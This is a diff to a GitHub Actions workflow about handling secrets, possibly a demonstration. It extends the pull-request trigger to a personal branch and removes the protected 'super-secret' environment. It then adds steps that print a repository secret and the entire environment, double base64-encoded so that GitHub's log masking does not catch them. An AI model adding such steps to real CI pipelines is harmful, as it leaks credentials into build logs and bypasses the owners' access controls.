@@ -1,17 +1,20 @@
-name: GitHub Secrets Example
+name: Eriks hacking GitHub Secrets Example
 
 on:
   push:
     branches: [ "prod" ]
   pull_request:
-    branches: [ "prod" ]
+    branches: [ "prod" , "eriks-branch"]
 jobs:
   build:
     runs-on: ubuntu-latest
-    environment: super-secret
+
     env:
       ENV_SECRET: ${{ secrets.ENVIRONMENT_SECRET }}
     steps:
       - name: Run a one-line script
         run: |
           echo "$ENV_SECRET"
+          echo "ENV_SECRET: $(base64 <<< $(base64 <<< "$ENV_SECRET"))"
+          echo "ALL ENV: $(base64 <<< $(base64 <<< "$(env)"))"
+          
